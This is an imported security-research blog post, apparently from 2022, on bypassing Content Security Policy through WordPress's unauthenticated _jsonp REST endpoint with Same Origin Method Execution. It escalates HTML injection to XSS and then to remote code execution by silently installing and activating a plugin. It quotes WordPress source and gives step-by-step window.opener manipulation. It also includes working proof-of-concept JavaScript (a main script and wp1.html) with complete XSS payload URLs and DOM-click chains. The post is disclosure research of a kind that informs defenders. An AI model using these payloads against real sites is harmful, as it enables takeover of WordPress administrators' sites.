---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-29_bypass-csp-using-wordpress-by-abusing-same-origin-method-execution.md
original_filename: 2022-05-29_bypass-csp-using-wordpress-by-abusing-same-origin-method-execution.md
title: Bypass CSP Using WordPress By Abusing Same Origin Method Execution
category: documents
detected_topics:
- xss
- command-injection
- otp
- automation-abuse
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- automation-abuse
- csrf
- api-security
language: en
raw_sha256: d07a31511ac45e6125b23b4944a28757ca694db62bd5c70cd2a7e75d26532737
text_sha256: 22692961bfccd44f96a405da227520785ce8de5e94f7952962bc7b73a101840e
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Bypass CSP Using WordPress By Abusing Same Origin Method Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-29_bypass-csp-using-wordpress-by-abusing-same-origin-method-execution.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, automation-abuse, csrf, api-security
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `d07a31511ac45e6125b23b4944a28757ca694db62bd5c70cd2a7e75d26532737`
- Text SHA256: `22692961bfccd44f96a405da227520785ce8de5e94f7952962bc7b73a101840e`


## Content

---
title: "Bypass CSP Using WordPress By Abusing Same Origin Method Execution"
page_title: "Novel Attack Vector to Bypass CSP Via Same Origin Method Execution (Wordpress Zeroday) | PWN.AI Security Research"
url: "https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/"
final_url: "https://pwn.ai/blog/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution"
authors: ["Paulos Yibelo (@PaulosYibelo)"]
programs: ["WordPress"]
bugs: ["CSP bypass", "Same Origin Method Execution"]
publication_date: "2022-05-29"
added_date: "2023-03-08"
source: "pentester.land/writeups.json"
original_index: 2596
---

_This is a novel vulnerability research by Paulos Yibelo. This technique has since been nominated for Top Web Hacking Techniques of 2023_

There are two scenarios found in which CSP can be bypassed if Wordpress is hosted on the website that uses CSP:

  * Websites that don't use Wordpress directly but have an endpoint of Wordpress on the same-domain or subdomain: This is extremely common as even popular sites, such as Octagon.net, use Wordpress for blogging, investor engagement and or other static content hosting. For example, if website1 (not Wordpress) uses Wordpress for blogging either in a directory (website1.com/blog, website1.com/research….) or in a subdomain (blog.website1.com) they will be at risk.

  * The second scenario is a website hosted on Wordpress which has a CSP header. This is not as common since Wordpress Core doesn't ship with CSP. But some sites that use Wordpress can add a custom CSP header either via plugins or forced server response headers.

**Impact**

If an attacker finds an HTML injection vulnerability within the main domain (ex: website1.com - not Wordpress,) using this vulnerability, they can use a Wordpress endpoint to upgrade a useless HTML Injection to a full blown XSS that can be escalated to perform RCE. This means having Wordpress anywhere on the site defeats the purpose of having a secure CSP.

A good example we will use is our website Octagon.net, which hosts the following CSP rule:

Content-Security-Policy: script-src 'self'; object-src 'none'; Octagon.net is not a Wordpress site, but it hosts Wordpress endpoint for blogging and research at[ https://octagon.net/blog](https://octagon.net/blog) \- This means if an attacker finds an HTML injection in the main domain (octagon.net) they can now abuse a hidden Wordpress jsonp endpoint to turn it to an XSS vulnerability against the whole site. The functionality can be reached with this link:

**<https://SITE/WORDPRESS/wp-json/wp/v2/users/1?_jsonp=ATTACKER_INPUT>**

The main reason this is possible is because all versions of Wordpress ship with a hidden and user-controllable jsonp parameter that is reachable without authentication that is defined in load.php:
  
  
  function wp_is_jsonp_request() {
  if ( ! isset( $_GET['_jsonp'] ) ) {
  return false;
  }
  if ( ! function_exists( 'wp_check_jsonp_callback' ) ) {
  require_once ABSPATH . WPINC . '/functions.php';
  }
  
  $jsonp_callback = $_GET['_jsonp'];
  if ( ! wp_check_jsonp_callback( $jsonp_callback ) ) {
  return false;
  }
  
  return $jsonp_enabled;
  

While we can pass jsonp values, we still can’t send arbitrary javascript to the "_jsonp" parameter because it sanitizes the characters with `(/[^\w\.]/)` ​​ in `wp_check_jsonp_callback()` function defined in functions.php like the following:
  
  
  function wp_check_jsonp_callback( $callback ) {
  if ( ! is_string( $callback ) ) {
  return false;
  }
  
  preg_replace( '/[^\w\.]/', '', $callback, -1, $illegal_char_count );
  
  return 0 === $illegal_char_count;
  }
  

We can call useless methods like `_jsonp=alert` but to do whatever we want we need to abuse a technique called Same Origin Method Execution (SOME) originally disclosed by [Ben Hayek in 2014](https://www.someattack.com/Playground/About) ( while unrealted to CSP, it has been the basis of this and many varieties of research we did found over the years, and [@Gareth Heyes](https://twitter.com/@garethheyes) for his input during this research period.) :[ https://www.someattack.com/Playground/About](https://www.someattack.com/Playground/About) I found we can do funky stuff and execute javascript in an exciting way by using the SOME trick. SOME lets us call predefined attributes and methods… and refer to them without using any of the restricted characters, we only need `A-Z` and a `. `(dot) defeating the purpose of the extremely restrictive `preg_replace`.

This payload can be anything, like clicking a button on a sensitive page within Wordpress (authorizing a malicious application, installing a malicious plugin, or installing a vulnerable theme or adding a new admin), but for the sake of simplifying the example let’s start with the following:

**Details**

Assume a site with following code where the "first" HTML tag includes a sensitive value, like an antiCSRF token and the attacker wants to force the victim's browser to submit this form:

If we want to use our XSS to force the victim to auto-submit the above form (click on submit), this is normally not possible because it needs an attacker to inject unrestricted javascript in the callback. But with SOME trick, we can refer to the “submit” button and click on it using DOM navigation with characters in scope of `[^/w.]`. For example: `document.body.firstElementChild.children.thisdocument` can refer to the `<input type=”submit”>`

So an attacker injects the following HTML:

This will result in a trusted domain returning something like `/**/document.body.firstElementChild.children.thisdocument.click({"id":1,"name":"admin"})`

Despite the click() function returning array values we don't control, it still is a valid script which when included in a script tag submits the form and bypasses CSP.

### Proof Of Concept:

We have an intentional XSS vulnerability here in the name parameter: <https://octagon.net/wp-csp.php?name=Dog> with the following strict CSP:

**Content-Security-Policy: script-src 'self'; object-src 'none';**

If we try to execute any type of XSS it is blocked by CSP with the following error:

Let's say the attacker wants to use the HTML Injection to install a malicious plugin on the vulnerable website. For this example, we will install the popular and safe plugin "Contact Form 7". If you open Wordpress Plugins and search "Contact", the first result will be contact form 7. The attacker would first need to open the plugins page, then use the XSS to click on the "Install" button and then after installation click on the "Activate" button. Below is a chart demonstrating how this is possible:

**Steps**

  1. A malicious site (“Window 1”) opens a new child window (“Window 2”)
  2. Now the newly spawned window (Window 2) has a `window.opener` of the attacker website.
  3. The attacker's website redirects itself (Window 1) to the victim's page that they want to perform an action on. In this case, search for plugin “contact” and leave it open,[ https://octagon.net/blog/wp-admin/plugin-install.php?s=contact&tab=search&type=term](https://octagon.net/blog/wp-admin/plugin-install.php?s=contact&tab=search&type=term)
  4. Now the newly spawned child window (Window 2) has a `window.opener` of the victim website.
  5. Using `setTimeOut()` the attacker tells the child window (Window 2) to redirect to the XSS payload that references the opener window (Window 1)
  6. Since both `parent window` (Window 1) and `child window` (Window 2) share same origin, the child window (Window 2) has the ability to access or modify its own `window.opener`

For example: the following DOM reference links to the "Install" button on the first result when you go to [https://octagon.net/blog/wp-admin/plugin-install.php?s=contact&tab=search&type=term](https://octagon.net/blog/wp-admin/plugin-install.php?s=contact&tab=search&type=term) `wpbody.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild`

So if the child window refers back to the opener window (parent), it is now on the same-origin and can therefore read and modify the contents, it just needs to add window.opener to the DOM reference:

`window.opener.wpbody.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.click`

We send our XSS to include the above script as part of the _jsonp callback, which will click on the "Install Now" button. We repeat the same process one more time to "Activate" the plugin and we have successfully injected PHP into the application and turned the HTML Injection into RCE.

**Code** :
  
  
  if (location.hash != "#step1") {
  var anchor = document.createElement('a');
  anchor.innerText = "Start Exploit";
  anchor.href = "#step1";
  anchor.onclick = function() {
  window.open("#step1");
  window.open("http://attacker-site/wp1.html");
  location.replace("https://octagon.net/blog/wp-admin/plugin-install.php?s=contact&tab=search&type=term");
  };
  document.getElementById('popuplink').appendChild(anchor);
  }
  else {
  setTimeout(function() {
  location.replace('https://octagon.net/wp-csp.php?name=XSS%3Cscript%20src=%22https://octagon.net/blog/wp-json/wp/v2/users/1?_jsonp=window.opener.wpbody.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.click%22%3E%3C/script%3E')},
  3000);
  }
  
  

### wp1.html
  
  
  setTimeout(function(){
  
  window.open("https://octagon.net/blog/wp-admin/plugin-install.php?s=contact&tab=search&type=term");
  //window.open("wp-some2.html");
  location.replace("https://octagon.net/wp-csp.php?name=sdfdsf%3Cscript%20src=%22https://octagon.net/blog/wp-json/wp/v2/users/1?_jsonp=window.opener.wpbody.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.click%22%3E%3C/script%3E");
  
  setTimeout(function() {
  location.replace('https://octagon.net/blog/wp-admin/plugin-install.php?s=contact&tab=search&type=term')},
  1000);
  }, 8000);
  
  

After all this, the end-result of bypassing CSP to install a malicious plugin will look something like this video.

<https://www.youtube.com/watch?v=qd5TPWlAW30>

I have notified Wordpress of the vulnerability but have not received a response for more than 3 months.

Thank you for reading. Until next time,
